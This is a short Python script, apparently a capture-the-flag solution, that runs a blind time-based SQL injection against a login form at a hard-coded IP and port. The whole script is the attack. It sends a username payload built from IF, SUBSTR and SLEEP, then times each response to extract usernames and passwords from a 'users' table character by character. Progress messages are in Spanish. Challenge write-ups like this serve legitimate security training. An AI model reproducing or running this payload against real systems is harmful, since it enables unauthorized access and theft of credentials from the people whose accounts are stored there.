#!/usr/bin/env python3

import signal
import time 
import sys
import requests
import string
from pwn import *
from termcolor import colored


def def_handler(sig, frame):
    print(colored("[+]Saliendo del programa...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://94.237.57.47:32067/"
characters = string.ascii_letters + '-_,:$/.' + string.digits


p1 = log.progress("SQLi")
p1.status("Inicializando")

database = ""

p2 = log.progress("Table_name from korp_terminal")

for pos in range(0,200):
    for character in characters:

        data_post = {
            "username": "admin'and if(substr(BINARY (select group_concat(username,':',password) from users),%d,1) = '%s',sleep(5),sleep(0))-- -" %(pos,character), 
            "password": "test"
        }
        
        
        start = time.time()
        r = requests.post(url, data=data_post)
        end = time.time()

        if end - start > 5:
            database += character
            p2.status(database)
            break

        
#korp_terminal
#users
